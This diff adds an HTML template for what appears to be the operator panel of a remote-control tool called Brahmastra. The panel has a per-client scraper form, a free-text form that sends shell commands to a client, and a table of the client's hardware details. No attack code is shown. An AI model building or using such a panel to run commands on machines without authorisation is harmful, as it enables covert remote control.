@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Bharmastra</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <script src="/js/query.js"></script>
+  <script src="/js/display.js"></script>
+  <script src="/js/scrape.js"></script>
+  <script>const id = {{id}}</script>
+
+</head>
+<body onload="displayquery()">
+    <div class="container">
+        <h2><center>Brahmastra-client configuration user: {{id}}</center></h2>
+        <center><b>Direct Controls: </b> <button id="scraper_button" onclick ="document.getElementById('scrapeid').style.display='block';">Engine_Scraper</button>
+        <button>Facebook_scrape</button><br/><br/>
+
+                <div id="scrapeid" style="display:none ; background-color:#e3e3e3; padding:2%;width:550px;border-radius:4px;">
+                    <form id="scrapeform" method="POST" onsubmit="return scrape();">
+                        Search Engine : <input type="text" name="se" placeholder="google,bing,Duckduckgo.."><br />
+                        Verbose : <input type="radio" name ="verbose" id="verbose_false" value="false" > False
+                        <input type="radio" name = "verbose" id="verbose_true" value="true"> True <br/>
+                        Debug : <input type="radio" name="debug" id="debug_false" value="false" > False
+                        <input type="radio" name="debug" id="debug_true" value="true"> True <br/>
+                        Keywords seperated by commas : <input type="text" name="keywords" placeholder="keyword1,keyword2"><br/>
+                        No of pages : <input type="text" name="noofpages" placeholder="1,2,3,4..."><br/><br>
+                        <input type="submit" value="Scrape"></input>
+                        
+                    </form>
+                    <center><span id="closebutton" onclick ="document.getElementById('scrapeid').style.display='none';">x</span></center>
+                </div>
+        </center><br/>
+       <center> 
+           <h4>Custom commands: <br/></h4>
+           <form id="commandform" onsubmit="return fire_query()">
+            Enter the Command and wait for response : <input type="text" name = "command" placeholder="shell_command_here"/>
+            <input type="submit" value = "fire_query"><br/><br/>
+        </form></center>
+        <center><div id="success"  class="alert alert-success" role="alert" style="display:none"></div></center>
+            <h5><center>Here's the client's Hardware details</center></h5>
+            <div id="sexydiv" style="overflow:scroll; height:600px;">
+                <table class="table table-sm">
+                <thead>
+                    <tr>
+                    <th scope="col">#</th>
+                    <th scope="col">query</th>
+                    <th scope="col">Result</th>
+                    </tr>
+                </thead>
+                <tbody id="tbody">
+
+                </tbody>
+                </table>
+            </div>
+    </div>
+    </body>
+</html>
